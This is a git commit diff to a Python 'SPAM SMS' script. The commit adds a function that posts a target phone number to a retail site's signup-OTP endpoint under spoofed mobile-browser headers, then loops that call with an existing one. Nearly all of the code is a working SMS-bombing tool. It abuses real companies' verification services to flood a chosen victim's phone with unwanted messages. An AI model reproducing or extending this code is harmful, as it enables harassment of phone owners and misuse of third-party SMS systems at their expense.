a0341f80069d60c78ae50abe25200cf3d1762dcf
BladeKnife <66865892+BladeKnife@users.noreply.github.com>
2020-06-14 22:43:47 +0700

    Update spam.py

--- spam.py
+++ spam.py
@@ -12,14 +12,33 @@ def marco():
     r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=d, headers=ua)
     if r:
         print ("\033[1;97mSEND TO \033[90m=>\033[1;92m ",no)
+def mapclub():
+    ua={
+    "Host": "cmsapi.mapclub.com",
+    "Connection": "keep-alive",
+    "Accept": "application/json, text/plain, */*",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
+    "content-type": "application/json",
+    "Origin": "https://www.mapclub.com",
+    "Referer": "https://www.mapclub.com/en/user/signup",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+    }
+    dat=json.dumps({"phone":no})
+    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
+    if "ok" in r:
+        print ("\033[1;97mSEND TO \033[90m=> \033[1;92m",no)
+    else:
+        print ("\033[1;91mFAILED")
+        sys.exit()
 os.system("clear")
-print ("""\t\033[1;97mSPAM SMS IDMARCO
+print ("""\033[1;97mSPAM SMS 2 OTP
 \033[1;97mCreator:\033[1;96mFahmiApz
 \033[1;97mYoutube:\033[1;96mKnifer12
 \033[90m-------------------------------""")
 no = input("\033[1;97mNo Target: \033[1;92m")
-jl = int(input("\033[1;97mLooping: \033[1;92m"))
-for i in range(jl):
+for i in range(1,4):
     sleep(1)
     marco()
-    sleep(3)
+    mapclub()
+
